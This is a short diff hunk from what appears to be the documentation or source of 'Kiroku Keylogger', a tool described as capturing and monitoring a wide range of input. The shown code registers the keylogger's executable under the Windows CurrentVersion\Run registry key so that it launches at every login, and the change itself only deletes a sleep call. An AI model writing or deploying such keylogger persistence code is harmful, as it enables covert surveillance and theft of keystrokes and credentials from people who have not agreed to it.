@@ -89,7 +89,6 @@ Kiroku Keylogger is a sophisticated tool designed to capture and monitor a wide 
              registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
              key_name = 'Kiroku'
              winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
-             time.sleep(0.01)
              winreg.CloseKey(registry_key)
          except Exception as e:
              print(f"Failed to add executable to registry: {e}")
